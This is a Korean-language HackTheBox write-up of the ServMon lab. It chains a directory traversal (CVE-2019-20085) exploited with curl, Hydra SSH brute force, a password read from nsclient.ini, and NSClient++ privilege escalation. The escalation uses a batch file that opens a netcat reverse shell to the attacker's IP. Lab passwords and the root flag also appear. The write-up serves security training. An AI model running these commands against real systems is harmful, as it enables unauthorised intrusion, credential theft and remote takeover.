# HackTheBox - ServMon Writeup

**OS:** Windows  
**Difficulty:** Easy  
**IP:** 10.129.188.203

---

## 목차

1. [[#정보 수집 (Enumeration)]]
2. [[#FTP 익명 접근]]
3. [[#NVMS-1000 Directory Traversal (CVE-2019-20085)]]
4. [[#SSH 접근 - Nadine]]
5. [[#권한 상승 - NSClient++ LPE]]
6. [[#Root Flag]]
7. [[#삽질 모음]]
8. [[#공격 흐름 요약]]

---

## 정보 수집 (Enumeration)

### Nmap 스캔

```bash
nmap -sC -sV 10.129.188.203
```

**열린 포트:**

|포트|서비스|
|---|---|
|21/tcp|FTP (Microsoft FTP Service)|
|22/tcp|SSH (OpenSSH)|
|80/tcp|HTTP (NVMS-1000)|
|135/tcp|MSRPC|
|139/tcp|NetBIOS-SSN|
|445/tcp|Microsoft-DS|
|5666/tcp|NRPE|
|6063/tcp|X11|
|8443/tcp|HTTPS-ALT (NSClient++)|
|49664~49670/tcp|Unknown (Windows RPC)|

---

## FTP 익명 접근

### 익명 로그인 확인

```bash
ftp 10.129.188.203
# Name: anonymous
# Password: (아무거나)
```

**결과:** `331 Anonymous access allowed` → `230 User logged in` ✅

### FTP 내부 탐색

```
ftp> ls
→ Users/

ftp> cd Users
ftp> ls
→ Nadine/
→ Nathan/

ftp> cd Nathan
ftp> ls
→ Notes to do.txt (182 bytes)

ftp> cd Desktop
→ 550 The system cannot find the file specified.  (접근 불가)
```

> **참고:** Desktop 폴더가 FTP로 직접 접근이 안 됨. Nathan 홈 디렉토리만 마운트된 구조.

### 파일 다운로드

```bash
get "Notes to do.txt"
```

**Notes to do.txt 내용:**

```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

> **힌트 발굴:**
> 
> - NVMS, NSClient++ 두 서비스가 언급됨
> - Passwords 파일이 어딘가에 존재함

### Nadine 폴더에서 추가 힌트

```
ftp> cd /Users/Nadine
ftp> get Confidential.txt
```

**Confidential.txt 내용:**

```
Nathan,
I left your Passwords.txt file on your Desktop. Please remove this once you
have edited it yourself and place it back into the secure folder.
Regards
Nadine
```

> **Nathan의 Desktop에 `Passwords.txt`가 있음!**

---

## NVMS-1000 Directory Traversal (CVE-2019-20085)

### 웹 확인

`http://10.129.188.203` 접속 시 **NVMS-1000** 감시 카메라 관리 소프트웨어 로그인 페이지 확인.

### 취약점 정보

- **CVE:** CVE-2019-20085
- **타입:** Directory Traversal (인증 불필요)
- **방법:** `GET /../../../../../../../../` 요청으로 서버 파일 읽기 가능

### Passwords.txt 탈취

```bash
curl "http://10.129.188.203/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt" --path-as-is
```

**결과:**

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

---

## SSH 접근 - Nadine

### Hydra 브루트포스

처음에 Nathan으로 시도했으나 실패. Nadine으로 재시도.

```bash
# passwords.txt 생성
cat > passwords.txt << EOF
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
EOF

# Nathan 시도 → 실패
hydra -l Nathan -P passwords.txt ssh://10.129.188.203 -t 4

# Nadine 시도 → 성공!
hydra -l Nadine -P passwords.txt ssh://10.129.188.203 -t 4
```

**결과:** `login: Nadine password: L1k3B1gBut7s@W0rk` ✅

### SSH 접속

```bash
ssh Nadine@10.129.188.203
# Password: L1k3B1gBut7s@W0rk
```

### User Flag

```bash
type C:\Users\Nadine\Desktop\user.txt
```

---

## 권한 상승 - NSClient++ LPE

### 서드파티 앱 확인

```bash
dir "C:\Program Files"
```

**발견된 비표준 앱:**

- `NVMS-1000`
- `NSClient++` ← 권한 상승 타겟

### NSClient++ 비밀번호 획득

```bash
type "C:\Program Files\NSClient++\nsclient.ini"
```

**결과:** `password = ew2x6SsGTxjRwXOT`

> **중요:** NSClient++는 localhost에서만 접근 가능하도록 설정되어 있어 SSH 터널링 필요.

### SSH 터널링

```bash
ssh -L 8443:127.0.0.1:8443 Nadine@10.129.188.203
```

브라우저에서 `https://127.0.0.1:8443` 접속 후 SSL 경고 무시 → NSClient++ 대시보드 진입.

### Exploit 준비 (C:\temp 셋업)

**Kali에서:**

```bash
# evil.bat 생성
echo '@echo off' > evil.bat
echo 'C:\temp\nc.exe 10.10.17.240 4444 -e cmd.exe' >> evil.bat

# nc.exe 복사
cp /usr/share/windows-windows-resources/binaries/nc.exe .

# HTTP 서버 시작
python3 -m http.server 8000
```

**Windows SSH에서:**

```bash
mkdir C:\temp
cd C:\temp

# evil.bat 다운로드 (괄호 echo 사용 - \t 탭 문제 방지)
(echo @echo off) > C:\temp\evil.bat
(echo C:\temp\nc.exe 10.10.17.240 4444 -e cmd.exe) >> C:\temp\evil.bat

# nc.exe 다운로드
curl.exe -O http://10.10.17.240:8000/nc.exe
```

### NSClient++ API로 스크립트 등록 및 실행

**Kali 리스너:**

```bash
nc -lvnp 4444
```

**스크립트 실행:**

```bash
curl -s -k -u admin:ew2x6SsGTxjRwXOT \
  "https://127.0.0.1:8443/api/v1/queries/evil/commands/execute"
```

**결과:** `NT AUTHORITY\SYSTEM` 쉘 획득 ✅

---

## Root Flag

```bash
type C:\Users\Administrator\Desktop\root.txt
```

**Root Flag:** `e2eddaa81307cb4f02e7e9c092357b29` 🎉

---

## 삽질 모음

### 1. FTP Desktop 접근 불가

- Nathan의 Desktop 폴더가 FTP에서 `550 error`로 접근 안 됨
- FTP가 홈 디렉토리를 루트로 마운트해서 Desktop 하위폴더 미노출
- **해결:** Directory Traversal로 우회

### 2. Hydra Nathan으로 먼저 시도

- Nathan 계정으로 먼저 SSH 브루트포스 → 0개 발견
- Nadine 계정으로 재시도해서 성공
- **교훈:** FTP에서 발견된 모든 유저 계정 시도할 것

### 3. Kali IP 착각

- tun0 IP를 `10.10.14.221`로 착각 → nc.exe 다운로드 타임아웃
- `hostname -I`로 확인하니 실제 IP는 `10.10.17.240`
- **교훈:** 항상 `hostname -I` 또는 `ifconfig`로 tun0 IP 확인

### 4. evil.bat `\t` 탭 문제

- `echo C:\temp\nc.exe ...` 명령어에서 `\t`가 탭 문자로 해석됨
- 결과적으로 bat 파일 내용이 `C: emp` + `c.exe`로 깨짐
- **해결:** `(echo ...)` 괄호 형식으로 작성하면 이스케이프 문제 없음

### 5. NSClient++ API 경로 오류

- `/api/v1/scripts/ext/scripts/evil.bat` POST → `500 no handler`
- `/api/v1/settings/query.json` POST → `500 no handler`
- **해결:** 먼저 Windows SSH에서 nsclient.ini에 직접 스크립트 등록 후 API로 실행

### 6. SSH 터널 없이 NSClient++ 접근 시도

- 처음에 `https://10.129.188.203:8443` 직접 접근 시도 → 연결 안 됨
- NSClient++ 설정에서 localhost 전용으로 바인딩되어 있었음
- **해결:** `ssh -L 8443:127.0.0.1:8443` 터널링 필수

---

## 공격 흐름 요약

```
[Nmap 스캔]
    ↓
[FTP 익명 접근]
    → Notes to do.txt (NVMS, NSClient++ 힌트)
    → Confidential.txt (Passwords.txt 위치 힌트)
    ↓
[CVE-2019-20085 Directory Traversal]
    → Nathan Desktop의 Passwords.txt 탈취
    ↓
[Hydra SSH 브루트포스]
    → Nadine / L1k3B1gBut7s@W0rk
    ↓
[SSH 접근 (Nadine)]
    → NSClient++ 발견
    → nsclient.ini에서 패스워드 획득
    ↓
[SSH 터널링 + NSClient++ LPE]
    → C:\temp에 nc.exe + evil.bat 업로드
    → API로 reverse shell 실행
    ↓
[NT AUTHORITY\SYSTEM 쉘]
    → root.txt 획득 🎉
```

---

